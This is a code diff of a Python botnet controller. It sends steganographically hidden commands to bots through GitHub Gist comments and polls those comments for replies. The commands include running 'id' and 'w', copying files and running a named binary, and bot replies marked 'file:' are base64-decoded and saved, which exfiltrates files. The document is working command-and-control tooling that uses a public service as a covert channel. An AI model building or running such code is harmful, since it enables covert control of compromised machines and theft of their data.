@@ -25,30 +25,6 @@ class Controller:
         dec_msg = STG.decode(message, method="snow")
         return dec_msg
 
-    def send_image(self, image_file):
-        # Read the image file and encode it as base64
-        with open(image_file, 'rb') as f:
-            image_data = f.read()
-            image_data = base64.b64encode(image_data).decode('utf-8')
-
-        # Create the payload for the Gist
-        payload = {
-            'body': image_data,
-            'description': 'An image file',
-            'public': True,
-            'files': {
-                'image.jpg': {
-                    'content': image_data
-                }
-            }
-        }
-
-        # Send the POST request to create the Gist
-        response = requests.post(self.url, json=payload, headers=self.headers)
-
-        # Print the response from the server
-        print(response.json())
-
     def check_for_updates(self):
         response = requests.get(self.url, headers=self.headers)
 
@@ -65,9 +41,16 @@ class Controller:
 
     def handle_message(self, msg):
         msg = self.decode_message(msg)
+        print(msg)
         sender = msg.split()[0]
         if sender == "bot:":
                 print(msg)
+                if msg.split()[1] == "file:":
+                    with open("file", 'wb') as f:
+                        data = base64.b64decode(msg.split()[2])
+                        f.write(msg.split()[2])
+                else:
+                    print(msg)
     
     def send_command(self, command, path=None, file_name=None, binary_name=None):
         if command == 'w':
@@ -80,14 +63,11 @@ class Controller:
             self.post_message(self.encode_message('id'))
 
         if command == 'cp':
-            self.post_message(self.encode_message('cp ' + file_name))
+            self.post_message(self.encode_message("cp " + file_name))
 
         if command == 'bin':
             self.post_message(self.encode_message('bin ' + binary_name))
-
-    def check_alive(self):
-        self.post_message("Hi")
-
+            
     def post_message(self, msg):
         # Send the disguised message to the controller
         data = {"body": msg}
@@ -104,12 +84,11 @@ if __name__ == "__main__":
     url = f"https://api.github.com/gists/{GIST_ID}/comments"
 
     controller = Controller(GIST_ID, MY_TOKEN, url)
-    bot = Bot(GIST_ID, MY_TOKEN, url)
+    # controller.send_command("cp", file_name="file.txt")
+    # controller.check_for_updates()
+    # controller.send_command("w")
 
-    controller.send_command('bin', binary_name="attack")
-
-    # while True:
-    #     print("controller - check for updates...")
-    #     controller.check_for_updates()
-    #     # controller.check_alive()
-    #     time.sleep(10)
+    while True:
+        print("controller - check for updates...")
+        controller.check_for_updates()
+        time.sleep(10)
